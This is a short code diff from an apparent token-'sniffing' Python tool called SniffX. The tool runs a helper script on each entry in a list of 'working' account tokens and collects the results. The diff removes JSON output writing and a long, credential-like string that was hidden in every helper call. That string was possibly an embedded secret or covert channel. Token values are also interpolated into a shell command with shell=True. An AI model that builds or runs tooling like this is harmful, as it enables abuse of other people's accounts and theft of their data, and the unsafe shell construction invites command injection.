@@ -173,15 +173,12 @@ if len(phone) > 0:
 done = 0
 title(f"[SniffX | chasa.wtf] Sniffing // Completed: {done}")
 open(folder + "\\all_data.txt", "x").close()
-f = open(folder + "\\all_data.json", "w")
-f.write("[\n")
-f.close()
 
 def sniff(tokens):
     global done
     for token in tokens:
         try:
-            subprocess.call(f'dont_rename.py {token} "{folder}" N {threshold} ODDFOFXUpgf7yEntul5ockCA.OFk6Ph.lmsA54bT0Fux1IpsYvey5XuZk04MTdqrd0vGDV1dcF0QPjom6OB.NQxUhj.I4JjFHIympR3mVF3UiUbbD5VVbiNTzQvPcLBacBmgajXQc7QAaU.XCgboz.c4t51kFWSEmdmaPnKoyUuu8E78E', shell=True)
+            subprocess.call(f'dont_rename.py {token} "{folder}" N {threshold}', shell=True)
         except:
             pass
         done += 1
@@ -196,9 +193,7 @@ for x in chunks(working_tokens, 13):
 for t in threads:
     t.join()
 
-f = open(folder + "\\all_data.json", "a")
-f.write("]")
-f.close()
+
 
 title("[SniffX | chasa.wtf] Completed.")
 print(f"{gray}[{green}+{gray}]{white} Completed all tokens. Press ENTER to exit.")
